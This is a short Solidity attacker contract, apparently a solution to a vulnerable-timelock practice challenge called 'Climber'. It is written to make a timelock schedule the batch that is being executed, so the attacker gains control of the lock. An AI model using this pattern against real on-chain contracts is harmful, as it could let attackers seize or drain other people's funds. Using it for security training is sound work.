//SPDX-License-Identifier:MIT

pragma solidity ^0.8.0;

import "../../climber/ClimberTimelock.sol";
import {PROPOSER_ROLE} from "../../climber/ClimberConstants.sol";

contract ClimberAttacker {
    ClimberTimelock public lock;
    address[] public targets;
    uint256[] public values;
    bytes[] public dataElements;
    bytes32 public salt;

    constructor(address payable _timeLock, bytes32 _salt) {
        lock = ClimberTimelock(_timeLock);
        targets.push(_timeLock);
        targets.push(_timeLock);
        targets.push(address(this));
        values = [0, 0, 0];
        salt = _salt;
    }

    function addData(bytes[] memory _data) public {
        dataElements = _data;
    }

    function attackSchedule() public {
        lock.schedule(targets, values, dataElements, salt);
    }

    function schedule(
        address[] calldata _targets,
        uint256[] calldata _values,
        bytes[] calldata _dataElements,
        bytes32 _salt) public {
        lock.schedule(_targets, _values, _dataElements, _salt);
    }
}